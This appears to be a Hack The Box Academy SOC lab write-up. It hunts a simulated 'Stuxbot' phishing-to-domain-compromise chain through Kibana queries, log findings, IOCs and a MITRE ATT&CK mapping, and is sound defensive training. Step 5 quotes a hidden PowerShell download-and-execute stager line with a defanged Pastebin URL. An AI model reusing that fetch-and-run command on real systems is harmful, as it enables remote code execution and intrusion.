# HTB Academy — Hunting For Stuxbot | Elastic Stack Threat Hunt

## Overview

This documents my threat hunting investigation based on a Threat Intelligence report for a malicious actor known as **Stuxbot**. The hunt was conducted using the Elastic Stack (Kibana) across Windows Sysmon logs, Windows audit logs, PowerShell logs, and Zeek network logs.

**Platform:** Hack The Box Academy
**SIEM:** Elastic Stack (Kibana)
**Log Sources:** Windows Sysmon (`windows*`), Zeek (`zeek*`)


---

## Threat Intelligence Summary

| Field | Details |
|---|---|
| Threat Actor | Stuxbot |
| Motivation | Espionage |
| Primary Vector | Phishing email → OneNote file |
| Targets | Windows users (opportunistic) |
| Risk Level | Critical |
| Potential Impact | Full machine takeover / Domain escalation |

**Known IOCs from Threat Intel Report:**

| Type | Value |
|---|---|
| OneNote File | `hxxps://transfer.sh/get/kNxU7/invoice.one` |
| OneNote File | `hxxps://mega.io/dl9o1Dz/invoice.one` |
| PowerShell Stager | `hxxps://pastebin.com/raw/AvHtdKb2` |
| PowerShell Stager | `hxxps://pastebin.com/raw/gj58DKz` |
| C2 Node | `91[.]90[.]213[.]14:443` |
| C2 Node | `103[.]248[.]70[.]64:443` |
| C2 Node | `141[.]98[.]6[.]59:443` |
| SHA256 Hash | `226a723ffb4a91d9950a8b266167c5b354ab0db1dc225578494917fe53867ef2` |
| SHA256 Hash | `c346077dad0342592db753fe2ab36d2f9f1c76e55cf8556fe5cda92897e99c7e` |
| SHA256 Hash | `018d37cbd3878258c29db3bc3f2988b6ae688843801b9abc28e6151141ab66d4` |

---

## Attack Chain

```
Phishing Email
      │
      ▼
invoice.one (OneNote file) downloaded via browser (MSEdge) from file.io
      │
      ▼
OneNote opens file → triggers embedded invoice.bat (batch file)
      │
      ▼
cmd.exe executes invoice.bat
      │
      ▼
PowerShell downloads and executes stager from Pastebin 
      │
      ├── Drops default.exe (persistence / RAT) → matches Threat Intel hash
      ├── Drops DomainPasswordSpray.ps1 (password spraying)
      ├── DNS query for Ngrok (C2 masking)
      ├── Connects to C2: 18.158.249.75:443
      │
      ▼
default.exe executes
      ├── Drops SharpHound.exe (AD enumeration)
      ├── Drops svchost.exe (masquerading — likely another agent)
      ├── Drops payload.exe and VBS file
      ├── Continued C2 beaconing (IP rotates to 3.125.102.39)
      │
      ▼
Password spray succeeds → svc-sql1 compromised
      │
      ▼
Lateral movement to PKI server via PsExec (PSEXESVC)
      │
      ▼
default.exe deployed on PKI under svc-sql1 profile
```

---

## Investigation Walkthrough

### Step 1 — Hunting for the Initial File Download

**Hypothesis:** A malicious OneNote file named `invoice.one` was downloaded via browser.

**Query (Sysmon Event ID 15 — FileCreateStreamHash):**
```kql
event.code:15 AND file.name:*invoice.one
```

**Findings:**
- 3 hits confirmed
- File downloaded via `msedge.exe` (Microsoft Edge)
- Saved to Bob's Downloads folder on host `WS001`
- Timestamp: `March 26, 2023 @ 22:05:47`

**Confirmed with Event ID 11 (File Create):**
```kql
event.code:11 AND file.name:invoice.one*
```

| Field | Value |
|---|---|
| File Name | `invoice.one:Zone.Identifier` |
| Host | `WS001.eagle.local` |
| User | `Bob` |
| Process | `msedge.exe` |
| MD5 Hash | `127021207d6415a3b426732b782efc24` |
| Timestamp | `Mar 26, 2023 @ 22:05:47.789` |

> Zone.Identifier confirms the file originated from the internet.

<!-- Add screenshot here -->
![Step 1 - invoice.one File Create Event](https://github.com/ilolokerry/Hack-the-box-Labs/blob/9db068684dc8da0c4fade279f1f426fcf80d0639/Threat%20Hunting%20%26%20Hunting%20With%20Elastic/media/invoice.png)

---

### Step 2 — Identifying the Source IP and Network Activity

**Query (Sysmon Event ID 3 — Network Connection):**
```kql
event.code:3 AND host.hostname:WS001
```

**Finding:** Source IP of WS001 confirmed as `192.168.28.130`

**Zeek DNS Query (timeframe 22:05:00 — 22:05:48):**
```kql
source.ip:192.168.28.130 AND dns.question.name:*
```

**Key DNS activity identified:**

| Timestamp | Domain | Notes |
|---|---|---|
| `22:05:02.703` | `mail.google.com` | Bob accessed Gmail |
| `22:05:35.548` | `file.io` | File hosting site accessed |
| `22:05:35.603` | `nav-edge.smartscreen.microsoft.com` | Defender SmartScreen triggered on download |

**file.io resolved IPs:** `34.197.10.85`, `3.213.216.16`

**Network connections to `34[.]197[.]10[.]85`:** 5 connections over port 443 — confirms Bob successfully downloaded `invoice.one` from `file.io`.

<!-- Add screenshot here -->
![Step 2 - Zeek DNS Query Results](https://github.com/ilolokerry/Hack-the-box-Labs/blob/9db068684dc8da0c4fade279f1f426fcf80d0639/Threat%20Hunting%20%26%20Hunting%20With%20Elastic/media/mail.png)
![Step 2 - Zeek DNS Query Results](https://github.com/ilolokerry/Hack-the-box-Labs/blob/9db068684dc8da0c4fade279f1f426fcf80d0639/Threat%20Hunting%20%26%20Hunting%20With%20Elastic/media/file%20io.png)

---

### Step 3 — Confirming File Execution

**Query (Sysmon Event ID 1 — Process Create):**
```kql
event.code:1 AND process.command_line:*invoice.one*
```

**Finding:** OneNote opened the file approximately 6 seconds after download.

| Field | Value |
|---|---|
| Timestamp | `Mar 26, 2023 @ 22:05:53.601` |
| Process | `ONENOTE.EXE` |
| File Opened | `C:\Users\bob\Downloads\invoice.one` |

<!-- Add screenshot here -->
![Step 3 - OneNote Execution](https://github.com/ilolokerry/Hack-the-box-Labs/blob/9db068684dc8da0c4fade279f1f426fcf80d0639/Threat%20Hunting%20%26%20Hunting%20With%20Elastic/media/file%20execute.png)

---

### Step 4 — Child Processes Spawned by OneNote

**Query:**
```kql
event.code:1 AND process.parent.name:"ONENOTE.EXE"
```

**Findings — 3 hits:**
- `OneNoteM.exe` — legitimate OneNote helper for launching files
- `cmd.exe` — executing `invoice.bat` from a temp directory

| Field | Value |
|---|---|
| Timestamp | `Mar 26, 2023 @ 22:06:28.250` |
| Process | `cmd.exe` |
| Command Line | `C:\WINDOWS\system32\cmd.exe /c "C:\Users\bob\AppData\Local\Temp\OneNote\16.0\Exported\{EC284AA9-1F31-4DC4-B3C5-3EEE8137EBC3}\NT\0\invoice.bat"` |
| Parent | `ONENOTE.EXE` |

> invoice.bat was embedded inside the OneNote file and extracted to a temp location on execution.

<!-- Add screenshot here -->
![Step 4 - cmd.exe spawned by OneNote](https://github.com/ilolokerry/Hack-the-box-Labs/blob/9db068684dc8da0c4fade279f1f426fcf80d0639/Threat%20Hunting%20%26%20Hunting%20With%20Elastic/media/note.png)
![Step 4 - cmd.exe spawned by OneNote](https://github.com/ilolokerry/Hack-the-box-Labs/blob/9db068684dc8da0c4fade279f1f426fcf80d0639/Threat%20Hunting%20%26%20Hunting%20With%20Elastic/media/note%20bat.png)

---

### Step 5 — Batch File Spawns PowerShell Stager

**Query:**
```kql
event.code:1 AND process.parent.command_line:*invoice.bat*
```

**Finding:** PowerShell launched with a command to download and execute a script from Pastebin.

| Field | Value |
|---|---|
| Timestamp | `Mar 26, 2023 @ 22:06:29.589` |
| Process | `powershell.exe` |
| PID | `9944` |
| Command Line | `-nop -w hidden -noni -noexit iex (iwr hxxps://pastebin.com/raw/33Z1jP6J -usebasicparsing)` |

> This matches the Threat Intel report — PowerShell stager downloaded from Pastebin. The `-w hidden` and `-nop` flags are classic obfuscation/evasion techniques.

<!-- Add screenshot here -->
![Step 5 - PowerShell Stager from Pastebin](https://github.com/ilolokerry/Hack-the-box-Labs/blob/9db068684dc8da0c4fade279f1f426fcf80d0639/Threat%20Hunting%20%26%20Hunting%20With%20Elastic/media/stager.png)

---

### Step 6 — PowerShell Activity (PID 9944)

**Query:**
```kql
process.pid:"9944" AND process.name:"powershell.exe"
```

**17 events returned.** Key activities identified:

| Timestamp | Activity | Detail |
|---|---|---|
| `22:06:35.187` | File created | `C:\Users\bob\AppData\Local\Temp\50135zxg.cmdline` |
| `22:06:35.187` | File created | `C:\Users\bob\AppData\Local\Temp\50135zxg.dll` |
| `22:06:35.317` | DNS query | `pastebin.com` |
| `22:06:35.345` | Network connection | `104[.]20[.]67[.]143` |
| `22:06:36.943` | DNS query | `b.eu.ngrok.io` — C2 masking via Ngrok |
| `22:06:36.970` | Network connection | `18[.]158[.]249[.]75:443` — likely C2 |
| `22:06:37.472` | Network connection | `18[.]158[.]249[.]75:443` |
| `22:17:32.961` | File created | `C:\Users\bob\AppData\Local\Temp\default.exe` — persistence RAT |
| `22:17:33.845` | Event code 13 | Registry modification — likely persistence |
| `23:23:57.243` | File created | `C:\Users\Public\DomainPasswordSpray.ps1` — password spray tool |
| `23:33:53.899` | Network connection | `192[.]168[.]28[.]200` |
| `23:33:53.904` | DNS query | `DC1.eagle.local` |

<!-- Add screenshot — this is the annotated screenshot you provided -->
![Step 6 - PowerShell PID 9944 Activity](https://github.com/ilolokerry/Hack-the-box-Labs/blob/9db068684dc8da0c4fade279f1f426fcf80d0639/Threat%20Hunting%20%26%20Hunting%20With%20Elastic/media/event.png)

---

### Step 7 — C2 Beaconing Confirmed via Zeek

**Zeek query for `18[.]158[.]249[.]75`:**
- 24 network connections from `192.168.28.130` to `18[.]158[.]249[.]75:443`
- Activity extended into the following day
- C2 IP later rotated — DNS queries for `ngrok.io` returned new IP: `3[.]125[.]102[.]39`
- Continued beaconing confirmed to `3[.]125[.]102[.]39:443`

<!-- Add screenshot here -->
![Step 7 - C2 Beaconing Zeek](https://github.com/ilolokerry/Hack-the-box-Labs/blob/9db068684dc8da0c4fade279f1f426fcf80d0639/Threat%20Hunting%20%26%20Hunting%20With%20Elastic/media/zeek%20one.png)
![Step 7 - C2 Beaconing Zeek](https://github.com/ilolokerry/Hack-the-box-Labs/blob/9db068684dc8da0c4fade279f1f426fcf80d0639/Threat%20Hunting%20%26%20Hunting%20With%20Elastic/media/ngrok.png)
![Step 7 - C2 Beaconing Zeek](https://github.com/ilolokerry/Hack-the-box-Labs/blob/9db068684dc8da0c4fade279f1f426fcf80d0639/Threat%20Hunting%20%26%20Hunting%20With%20Elastic/media/zek%202.png)
---

### Step 8 — Persistence via default.exe

**Query:**
```kql
process.name:"default.exe"
```

**68 hits — key findings:**

- DNS queries for Ngrok confirmed
- Connections to both C2 IPs (`18[.]158[.]249[.]75` and `3[.]125[.]102[.]39`)
- Dropped additional tools:
  - `C:\Users\Public\SharpHound.exe` — AD enumeration tool
  - `C:\Users\bob\AppData\Local\Temp\svchost.exe` — masquerading as legitimate Windows process
  - `payload.exe` and a VBS file also uploaded

**Hash confirmed matching Threat Intel report:**
```kql
process.hash.sha256:018d37cbd3878258c29db3bc3f2988b6ae688843801b9abc28e6151141ab66d4
```

- Hash found on **WS001** and **PKI** — attacker has reached the PKI server
- Backdoor placed under `svc-sql1` profile — account likely compromised

<!-- Add screenshot here -->
![Step 8 - default.exe Activity](./screenshots/step8_default_exe.png)

---

### Step 9 — Active Directory Enumeration via SharpHound

**Query:**
```kql
process.name:"SharpHound.exe"
```

**4 hits — executed twice, approximately 2 minutes apart on March 27, 2023**
- Arguments included collection method `all` — full AD enumeration performed
- Attacker likely mapped attack paths for domain escalation

<!-- Add screenshot here -->
![Step 9 - SharpHound Execution](./screenshots/step9_sharphound.png)

---

### Step 10 — Lateral Movement to PKI via PsExec

- First execution of `default.exe` on PKI had parent process `PSEXESVC.exe`
- Confirms lateral movement via PsExec (Microsoft-signed Sysinternals tool)
- `svc-sql1` confirmed in `user.name` field — account was used for lateral movement

<!-- Add screenshot here -->
![Step 10 - PsExec Lateral Movement to PKI](./screenshots/step10_psexec_pki.png)

---

### Step 11 — Password Spray Confirms svc-sql1 Compromise

**Query:**
```kql
(event.code:4624 OR event.code:4625) AND winlog.event_data.LogonType:3 AND source.ip:192.168.28.130
```

**6 logon events found:**

| Event | Account | Host | Notes |
|---|---|---|---|
| 4625 (Failed) | Administrator | DC1 | ~March 26 — spray attempted on admin, failed |
| 4625 (Failed) | Administrator | DC1 | ~March 26 — second failed attempt |
| 4624 (Success) | svc-sql1 | PKI | March 28 — successful logon |
| 4624 (Success) | svc-sql1 | PKI | March 28 — repeated success |
| 4624 (Success) | svc-sql1 | PAW | March 28 — lateral spread |

> Administrator spray failed. svc-sql1 was successfully cracked via DomainPasswordSpray.ps1 two days later.

<!-- Add screenshot here -->
![Step 11 - Password Spray Logon Events](./screenshots/step11_password_spray.png)

---

### Step 12 — PowerView Network Share Scanning

**Query ran to find PowerShell scripts loaded on WS001:**
```kql
"ps1" AND host.hostname:"WS001"
```

**Finding:** PowerShell code loaded into memory consistent with **PowerView** (part of the PowerSploit framework by @harmj0y). The code was scanning and enumerating network shares across the domain — a classic pre-lateral movement reconnaissance technique.

<!-- Add screenshot here -->
![Step 12 - PowerView Share Enumeration](./screenshots/step12_powerview.png)

---

## Confirmed IOCs from Investigation

| Type | Value | Confirmed |
|---|---|---|
| IP | `192[.]168[.]28[.]130` | WS001 source IP |
| IP | `34[.]197[.]10[.]85` | file.io — malware delivery |
| IP | `18[.]158[.]249[.]75` | C2 server (Ngrok-masked) |
| IP | `3[.]125[.]102[.]39` | C2 server (rotated Ngrok IP) |
| IP | `104[.]20[.]67[.]143` | Pastebin CDN |
| Domain | `file[.]io` | Malware hosting |
| Domain | `b.eu.ngrok[.]io` | C2 masking |
| Domain | `pastebin[.]com` | Stager delivery |
| URL | `hxxps://pastebin.com/raw/33Z1jP6J` | PowerShell stager |
| File | `invoice.one` | Initial phishing payload |
| File | `invoice.bat` | Embedded batch script |
| File | `default.exe` | RAT / persistence mechanism |
| File | `DomainPasswordSpray.ps1` | Password spray tool |
| File | `SharpHound.exe` | AD enumeration |
| File | `svchost.exe` | Masquerading agent |
| Hash (SHA256) | `018d37cbd3878258c29db3bc3f2988b6ae688843801b9abc28e6151141ab66d4` | default.exe — matches Threat Intel |
| User | `Bob` | Initial victim |
| User | `svc-sql1` | Compromised service account |
| Host | `WS001.eagle.local` | Initially compromised workstation |
| Host | `PKI` | Laterally compromised server |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Spearphishing Link | T1566.002 |
| Execution | User Execution: Malicious File | T1204.002 |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |
| Execution | Command and Scripting Interpreter: Windows Command Shell | T1059.003 |
| Persistence | Boot or Logon Autostart Execution | T1547 |
| Defense Evasion | Masquerading | T1036 |
| Defense Evasion | Obfuscated Files or Information | T1027 |
| Credential Access | OS Credential Dumping | T1003 |
| Credential Access | Brute Force: Password Spraying | T1110.003 |
| Discovery | Domain Account Discovery | T1087.002 |
| Discovery | Network Share Discovery | T1135 |
| Lateral Movement | Remote Services: SMB/Windows Admin Shares (PsExec) | T1021.002 |
| Collection | Archive Collected Data | T1560 |
| Command & Control | Application Layer Protocol: Web Protocols | T1071.001 |
| Command & Control | Proxy: Multi-hop Proxy (Ngrok) | T1090.003 |
| Command & Control | Ingress Tool Transfer | T1105 |

---

## Key Takeaways

- A single phishing email with a OneNote attachment led to full domain compromise across multiple hosts
- Ngrok was used to mask C2 traffic behind a legitimate domain, making detection harder without DNS-level monitoring
- Zeek logs were critical for identifying the download source and C2 beaconing — Sysmon alone was not sufficient
- The attacker operated with a time gap between actions suggesting human interaction rather than fully automated execution
- Password spraying with a domain service account (`svc-sql1`) enabled lateral movement to the PKI server
- Tools like SharpHound and PowerView confirm the attacker was mapping the domain for escalation paths

---

*Completed as part of the Hack The Box Academy SOC Analyst learning path.*
